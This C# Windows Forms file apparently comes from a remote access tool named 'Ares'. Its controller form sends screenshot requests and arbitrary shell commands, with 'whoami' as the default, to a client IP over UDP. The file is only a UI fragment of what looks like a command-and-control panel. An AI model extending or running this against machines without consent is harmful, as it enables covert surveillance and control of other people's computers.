using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Ares
{
    public partial class Form2 : Form
    {
        public static IPAddress ClientIP;
        public static Int32 ClientPort;
        public Form2()
        {
            InitializeComponent();
            
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            label4.Text = ClientIP.ToString() + ":" + ClientPort;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            UDPHeartBeat.Send("<SCREENSHOTREQ>", ClientIP);
        }

        

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                if (ExecBox != null)
                {
                    UDPHeartBeat.Send("<EXECREQ> "+ExecBox.Text, ClientIP);
                }
                else
                {
                    UDPHeartBeat.Send("<EXECREQ> whoami", ClientIP);
                }

            }
            catch(Exception ee)
            {
                Console.WriteLine(ee);
            }
        }
    }
}
